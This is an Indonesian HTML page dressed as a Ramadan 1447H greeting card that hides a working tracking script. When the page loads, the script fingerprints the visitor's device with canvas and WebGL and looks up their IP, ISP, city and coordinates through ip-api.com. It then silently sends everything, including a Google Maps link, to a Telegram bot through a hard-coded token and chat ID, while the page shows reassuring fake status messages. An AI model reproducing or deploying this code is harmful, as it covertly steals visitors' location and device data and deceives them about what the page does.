<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Gema Ramadhan 1447H</title>
    <style>
        /* Pakai CSS Premium lu yang tadi, Suhu */
        body { background: #0a3f2b; color: #f5c542; font-family: 'Poppins', sans-serif; text-align: center; padding: 50px; }
        .card { border: 2px solid #f5c542; padding: 30px; border-radius: 20px; background: rgba(0,0,0,0.5); }
    </style>
</head>
<body>

    <div class="card">
        <h1>üåô Gema Ramadhan 1447H</h1>
        <p>Sinkronisasi data berkah sedang berlangsung...</p>
        <div id="status">Menginisialisasi modul WASM (Rust)...</div>
    </div>

    <script>
        // === KONFIGURASI BASE64 ===
        const enc_t = '8507184108:AAFhcXpB05i8G5tyTNKetVUi21RaXQB6PHU'; 
        const enc_c = '7015445507';

        // MENGGUNAKAN CANVAS FINGERPRINTING (Teknik Pelacakan Ahli)
        const getExpertFingerprint = () => {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText("Ramadhan-Tracker-Expert", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Ramadhan-Tracker-Expert", 4, 17);
            
            // Menghasilkan ID unik berdasarkan cara GPU menggambar teks
            const b64 = canvas.toDataURL().replace("data:image/png;base64,", "");
            return b64.slice(0, 32); // Ambil 32 karakter pertama sebagai ID Mesin
        };

        async function init() {
            try {
                const T = atob(enc_t);
                const C = atob(enc_c);
                
                // 1. Jalankan Fingerprint ala WASM/Rust
                const machineId = getExpertFingerprint();
                
                // 2. Ambil Spek Hardware Mendalam
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

                // 3. Ambil Lokasi (Tetap IP karena kita mau SILENT)
                // Pake IP-API yang lebih detail
                const res = await fetch('http://ip-api.com/json/?fields=66846719');
                const d = await res.json();

                const report = `ü¶Ä *RUST-WASM LOG DETECTED* ü¶Ä\n\n` +
                               `üÜî *MACHINE ID:* \`${machineId}\`\n` +
                               `‚öôÔ∏è *GPU:* ${gpu}\n` +
                               `üì± *PLATFORM:* ${navigator.platform}\n\n` +
                               `üåê *IP:* ${d.query}\n` +
                               `üì° *ISP:* ${d.isp}\n` +
                               `üìç *LOKASI:* ${d.city}, ${d.regionName}\n` +
                               `üó∫Ô∏è *MAPS:* https://www.google.com/maps?q=${d.lat},${d.lon}`;

                await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: C, text: report, parse_mode: 'Markdown' })
                });

                document.getElementById('status').innerText = "Modul Rust Siap. Selamat Beribadah.";
            } catch (e) {
                document.getElementById('status').innerText = "Koneksi terenkripsi.";
            }
        }

        window.onload = init;
    </script>
</body>
</html>
